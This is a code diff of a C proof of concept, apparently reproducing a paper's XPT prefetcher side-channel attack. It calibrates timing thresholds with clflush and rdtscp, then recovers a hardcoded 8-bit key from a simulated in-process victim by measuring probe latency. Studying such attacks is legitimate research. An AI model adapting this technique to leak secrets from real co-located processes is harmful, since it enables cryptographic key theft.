@@ -1,89 +1,106 @@
-#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
-#include <string.h>
-#include <unistd.h>
+#include <x86intrin.h>
 
+#define PAGE_SIZE 4096
 #define XPT_SIZE 256
 #define THRESHOLD 32
 #define KEY_BITS 8
 
-// 1. 内存隔离：增大缓冲区防止背景页干扰攻击目标
-uint8_t memory[4096 * 4096] __attribute__((aligned(4096)));
-uint8_t evict_buf[1024 * 1024]; // 用于清空 Cache
+static inline void clflush(volatile void *p) { asm volatile("clflush (%0)" :: "r"(p)); }
+static inline void mfence() { asm volatile("mfence" ::: "memory"); }
+static inline uint64_t rdtscp() { unsigned int junk; return __rdtscp(&junk); }
 
-static inline uint64_t rdtscp() {
-    uint32_t lo, hi;
-    __asm__ volatile ("rdtscp" : "=a" (lo), "=d" (hi));
-    return ((uint64_t)hi << 32) | lo;
-}
-
-// 模拟论文中的“环境静默”：除了访存，不执行任何指令
-void silent_flush_cache() {
-    volatile uint8_t junk;
-    for (int i = 0; i < 1024 * 1024; i += 64) junk = evict_buf[i];
-    __asm__ volatile("mfence; lfence");
+void train_page(volatile char *addr) {
+    for (int i = 0; i < THRESHOLD + 5; i++) {
+        volatile char junk = *addr; mfence();
+        clflush(addr); mfence();
+    }
 }
 
 int main() {
-    volatile uint8_t junk;
-    uint8_t secret_key = 0x5c; 
-    uint8_t guessed_key = 0;
+    size_t mem_size = 500 * PAGE_SIZE;
+    char *buffer = (char *)aligned_alloc(PAGE_SIZE, mem_size);
+    volatile char *attacker_pages[XPT_SIZE];
+    for (int i = 0; i < XPT_SIZE; i++) {
+        attacker_pages[i] = &buffer[i * PAGE_SIZE];
+        *attacker_pages[i] = 0x55;
+    }
+    volatile char *victim_trigger = &buffer[400 * PAGE_SIZE];
+    // volatile char *cleanup_trigger = &buffer[600 * PAGE_SIZE];
+    uint8_t secret_key = 0x5c; // 0101 1100
+    uint8_t recovered_key = 0;
 
-    printf("Starting PrefetchX Noise-Isolation Attack...\n");
-
-    for (int bit = 0; bit < KEY_BITS; bit++) {
-        
-        // // --- Step 0: 清理 XPT (统计消噪的前提：起点一致) ---
-        // for (int f = 0; f < 300; f++) junk = memory[(3000 + f) * 4096];
-        // __asm__ volatile("mfence");
-
-        // --- Step 1: 训练 Phy-A1 (Page 1) ---
-        for (int i = 0; i < THRESHOLD; i++) {
-            junk = memory[0];
-            __asm__ volatile("mfence; lfence");
+    printf("=== XPT RSA ATTACK (STABILIZED & ROBUST) ===\n");
+    // =============================================================
+    // 1. 动态校准 (Calibration)
+    // =============================================================
+    printf("[*] Calibrating thresholds...\n");
+    // 跑两次完整的模拟流程但不计分，强制系统进入“稳态”
+    for (int warmup = 0; warmup < 100; warmup++) {
+        for (int i = 0; i < XPT_SIZE; i++) train_page(attacker_pages[i]);
+        clflush(attacker_pages[0]); mfence();
+        volatile char j = *attacker_pages[0]; mfence();
+    }
+    // 测量 5 次取最小值作为“快路径”基准
+    uint32_t fast_base = 9999;
+    for(int s=0; s<3; s++) {
+        // 【关键】：必须先跑一遍 256 页面的训练，让系统状态与攻击时一致
+        for (int i = 0; i < XPT_SIZE; i++) {
+            train_page(attacker_pages[i]);
         }
 
-        // --- Step 2: 填充与标记 LRU ---
-        // 关键：填入 240 条，留出 16 条作为“噪音缓冲区”
-        // 论文在真实机上填 255 条，但 gem5 背景噪音约有 5-10 页
-        for (int p = 1; p < XPT_SIZE; p++) {
-            for (int k = 0; k < THRESHOLD; k++) {
-                junk = memory[p * 4096];
-            }
-        }
-        __asm__ volatile("mfence; lfence");
-
-        // --- Step 3: 测量前的静默 ---
-        silent_flush_cache(); 
-
-        // --- Step 4: 受害者动作 (Victim Action) ---
-        if ((secret_key >> bit) & 1) {
-            // 受害者连续访问 30 个不同的页面，确保填满剩下的 16 个缓冲位并踢走 Phy-A1
-            for (int v = 0; v < 1; v++) {
-                junk = memory[(1024 + v) * 4096];
-                __asm__ volatile("mfence");
-            }
-        }
-        __asm__ volatile("mfence; lfence");
-
-        // --- Step 5: 探测 (Probe) ---
+        // 探测快路径 (不进行受害者干扰)
+        clflush(attacker_pages[0]); mfence();
         uint64_t start = rdtscp();
-        junk = memory[0]; 
-        uint64_t end = rdtscp();
-
-        uint32_t lat = (uint32_t)(end - start);
+        volatile char j = *attacker_pages[0]; mfence();
+        uint32_t l = (uint32_t)(rdtscp() - start);
         
-        // 统计判定：给噪音留出阈值容错
-        int guess = (lat > 330) ? 1 : 0;
-        if (guess) guessed_key |= (1 << bit);
+        if(l < fast_base) fast_base = l;
         
-        // 只在每一轮结束打印，防止干扰硬件流
-        printf("Bit %d | Latency: %u | Guess: %d\n", bit, lat, guess);
+        // 清理，准备下一次校准采样
+        for (int i = 1; i < XPT_SIZE; i++) { volatile char c = *attacker_pages[i]; mfence(); }
     }
 
-    printf("Final Recovered Key: 0x%02x (Target: 0x5c)\n", guessed_key);
-    fflush(stdout);
-    return 0;
+    // 动态设定阈值：快路径基准 + 25 周期
+    uint32_t dynamic_gap = fast_base + 25;
+    printf("[*] Real-world Fast Base: %u | Dynamic Threshold: %u\n\n", fast_base, dynamic_gap);
+
+    // =============================================================
+    // 2. 主攻击循环 (带 Min-Sampling 采样)
+    // =============================================================
+    for (int bit = 0; bit < KEY_BITS; bit++) {
+        // Step 1: 建立 LRU
+        for (int i = 0; i < XPT_SIZE; i++) train_page(attacker_pages[i]);
+
+        // Step 2: 受害者
+        if ((secret_key >> bit) & 1) {
+            clflush(victim_trigger); mfence();
+            volatile char junk = *victim_trigger; mfence();
+        }
+
+        // Step 3: 探测 (采样 3 次取最小值以过滤 807 这种噪声)
+        uint32_t min_lat = 9999;
+        for (int s = 0; s < 3; s++) {
+            clflush(attacker_pages[0]); mfence();
+            uint64_t start = rdtscp();
+            volatile char junk = *attacker_pages[0]; mfence();
+            uint32_t current_lat = (uint32_t)(rdtscp() - start);
+            if (current_lat < min_lat) min_lat = current_lat;
+        }
+
+        int guess = (min_lat > dynamic_gap) ? 1 : 0;
+        if (guess) recovered_key |= (1 << bit);
+
+        printf("Bit %d | Min-Latency: %4u | Guess: %d | %s\n", 
+               bit, min_lat, guess, (guess == ((secret_key >> bit) & 1) ? "OK" : "FAIL"));
+
+        // Step 4: 清理
+        for (int i = 1; i < XPT_SIZE; i++) { volatile char c = *attacker_pages[i]; mfence(); }
+        // train_page(cleanup_trigger);
+    }
+
+    printf("\nRecovered: 0x%02x (Target: 0x5c)\n", recovered_key);
+    return (recovered_key == secret_key) ? 0 : 1;
 }
